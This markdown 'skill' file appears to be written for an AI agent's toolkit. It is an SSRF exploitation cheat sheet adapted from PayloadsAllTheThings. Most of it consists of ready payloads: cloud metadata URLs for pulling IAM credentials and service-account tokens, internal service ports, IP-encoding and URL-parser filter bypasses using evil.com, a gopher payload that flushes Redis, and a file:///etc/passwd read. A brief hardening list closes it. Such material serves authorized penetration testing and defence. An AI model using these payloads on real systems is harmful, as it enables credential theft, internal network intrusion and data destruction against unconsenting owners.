---
name: ssrf
description: Exploit Server-Side Request Forgery to reach internal services and cloud metadata; bypass filters with IP encoding, DNS rebinding, URL parsers, and gopher/file
domain: cybersecurity
subdomain: web-application-security
tags: [ssrf, cloud-metadata, gopher, internal-services]
version: "1.0"
license: MIT
source: PayloadsAllTheThings/Server Side Request Forgery
---

# Server-Side Request Forgery (SSRF)

## Overview
Endpoint takes a URL/host and the server fetches it. Attacker pivots to internal services (admin panels, databases, cloud metadata) inaccessible from the public internet.

## Targets

### Cloud Metadata Endpoints
- **AWS IMDSv1**: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- **AWS IMDSv2**: requires PUT for token first; SSRF that supports method+headers needed.
- **GCP**: `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` (needs `Metadata-Flavor: Google`).
- **Azure**: `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs `Metadata: true`).
- **Alibaba**: `http://100.100.100.200/latest/meta-data/`.
- **DigitalOcean / Hetzner / Oracle Cloud**: each has its own metadata IP.

### Internal Services
- `http://127.0.0.1:6379/` Redis, `:11211` memcached, `:9200` ES, `:5984` couchdb, `:8080` admin, `:80/server-status`.
- Kubernetes: `kubelet:10250/pods`.

## Filter Bypass

### IP encoding
- Decimal: `http://2130706433/` = 127.0.0.1.
- Octal: `http://0177.0.0.1/`.
- Hex: `http://0x7f.0.0.1/`.
- Mixed: `http://127.0.1/`, `http://127.1/`.
- Zero-shorthand: `http://0/`.
- IPv6: `http://[::1]/`, `[::ffff:127.0.0.1]`.
- Dotless: enclosing zero `http://0.0.0.0/`.

### DNS
- Subdomain wildcard like `169.254.169.254.nip.io`, `xip.io`.
- DNS Rebinding (see dedicated skill).
- DNS A record pointing 127.0.0.1.

### URL parser tricks
- `http://evil.com@127.0.0.1/` — userinfo.
- `http://127.0.0.1#@evil.com` / fragment.
- `http://127.0.0.1%23@evil.com`.
- Backslash, double slash, scheme-only, CRLF in URL.

### Protocol smuggling (curl-based backends)
- `gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a` → arbitrary TCP payload to Redis/SMTP/etc.
- `dict://127.0.0.1:11211/stat`.
- `ftp://`, `file:///etc/passwd`, `ldap://`, `tftp://`.

## Blind SSRF Confirmation
- OOB DNS/HTTP via Burp Collaborator / interactsh.
- Timing differential (open port → fast 200; closed → slow timeout).

## Tools
- **SSRFmap**, **Gopherus** (gopher payloads for redis/mysql/smtp/fastcgi).
- **interactsh**, **Burp Collaborator**.

## Hardening
- Allowlist destination hosts/schemes; resolve & re-check after DNS lookup (TOCTOU).
- Block RFC1918, loopback, link-local, multicast, IMDS IPs at egress.
- Pin DNS resolution; reject re-bound responses.
- Force IMDSv2 on AWS.
- Use signed, restricted URLs for image/file fetches.

## References
- `payloadsallthethings/Server Side Request Forgery/README.md`
- HackTricks SSRF; Orange Tsai "A new era of SSRF".
